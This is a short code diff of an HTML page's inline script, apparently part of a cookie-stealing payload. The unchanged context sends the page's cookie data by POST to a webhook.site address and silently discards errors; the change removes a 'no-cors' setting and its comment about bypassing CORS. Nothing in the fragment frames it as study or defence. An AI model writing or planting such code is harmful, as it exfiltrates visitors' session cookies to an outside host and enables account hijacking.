@@ -13,8 +13,7 @@
     fetch('https://webhook.site/09a6b80e-9156-4405-bade-5b37f5ecd762', {
       method: 'POST',
       body: JSON.stringify({ cookie: cookieData }),
-      headers: { 'Content-Type': 'application/json' },
-      mode: 'no-cors' // Important: Bypass CORS (but won't confirm success)
+      headers: { 'Content-Type': 'application/json' }
     }).catch(() => {});
   </script>
 </body>
